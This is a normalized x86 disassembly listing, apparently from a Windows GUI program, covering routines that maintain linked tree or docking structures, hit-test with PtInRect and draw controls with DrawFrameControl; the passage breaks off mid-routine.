mov eax [ ebp - 0x8 ]
call sub_42c94c
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367fc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov dl [ ebp - 0x15 ]
mov [ eax + 0x10 ] dl
mov al [ ebp - 0x15 ]
dec al
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_42c918
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov al [ eax + 0x10 ]
mov [ ebp - 0x16 ] al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_436a04
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_436a04
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x15 ]
cmp al [ ebp - 0x16 ]
jne r-xdata
mov al [ ebp - 0x16 ]
mov [ ebp - 0x15 ] al
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_436a04
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_436a04
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
jmp r-xdata
mov al [ ebp - 0x15 ]
push eax
xor eax eax
mov al [ ebp - 0x9 ]
mov al [ eax + rw-data ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_437548
xor eax eax
mov al [ ebp - 0x9 ]
mov al [ eax + rw-data ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4377bc
jmp r-xdata
sub_437548
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367fc
mov [ ebp - 0x10 ] eax
mov al [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x10 ] al
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x68 ] eax
mov al [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] al
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x40 ] edx
mov [ eax + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_438a10
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x20 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_438a10
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_438df4
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x20 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4371a8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x14 ] edx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ edx + 0x20 ] eax
adc eax 0x0
mov eax [ ebp - 0x10 ]
call sub_436b04
mov eax [ ebp - 0x4 ]
push eax
push sub_438f98
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4371a8
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
jmp r-xdata
sub_4377bc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0xc ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
call sub_436b04
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
sub_4378a8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
sub edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436968
mov [ ebp - 0x8 ] eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436968
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
sub edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x10 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x10 ] edx
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4378a8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0xc ]
cmp eax edx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov edx [ edx + 0x18 ]
add edx [ ebp - 0x8 ]
cmp eax edx
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4378a8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436a04
add eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436a04
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + 0x34 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x10 ]
add eax [ edx + 0x38 ]
sub eax 0xf
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_437b0c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_430844
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_4307d8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x8 ]
sub edx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov ebx [ ebp - 0x8 ]
sub eax [ ebx + 0x30 ]
call sub_43b77c
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x24 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_437bc4
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_437b0c
pop ecx
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x18 ]
cmp eax [ edx + 0x90 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_436840
dec eax
jl r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_437120
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_4378a8
pop ecx
sub_437c60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44cae0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_44d04c
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_437cb0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_437f00
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_438488
mov eax [ ebp - 0x8 ]
call sub_43707c
xor eax eax
push ebp
push sub_437ee3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x20 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
inc eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437eea
mov eax [ ebp - 0x8 ]
call sub_43708c
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367fc
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
push ebp
lea eax [ ebp - 0xc ]
call sub_437c60
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov bx 0xffbd
call sub_44c24c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x24 ]
call sub_436c2c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_437c60
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_42c838
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_42d9ac
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x64 ] edx
jmp r-xdata
mov eax [ ebp - 0x24 ]
call sub_44c070
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x24 ]
mov [ edx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x24 ]
mov [ edx + 0x14 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x2c ] eax
inc [ ebp - 0x1c ]
dec [ ebp - 0x30 ]
jne r-xdata
sub_437f0c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
add eax [ ebp - 0x8 ]
sub eax 0x2
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x18 ]
add ecx [ ebp - 0x4 ]
sub ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43b7c8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40fc38
push eax
call DrawFrameControl
mov esp ebp
pop ebp
retn
sub_437f64
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x80000014
call sub_40efe8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_40f8d4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40f858
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40f858
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0x80000010
call sub_40efe8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_40f858
mov ecx [ ebp - 0x8 ]
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_40f858
mov esp ebp
pop ebp
retn 0x4
sub_437ff8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x4b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
inc edx
call sub_437f0c
pop ecx
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x5
push eax
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
sub ecx [ eax + 0x18 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
add edx 0x3
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax 0x2
call sub_437f64
pop ecx
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
add eax 0x8
push eax
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
sub ecx [ eax + 0x18 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
add edx 0x6
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax 0x2
call sub_437f64
pop ecx
push ebp
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
inc eax
call sub_437f0c
pop ecx
push ebp
mov eax [ ebp + 0x8 ]
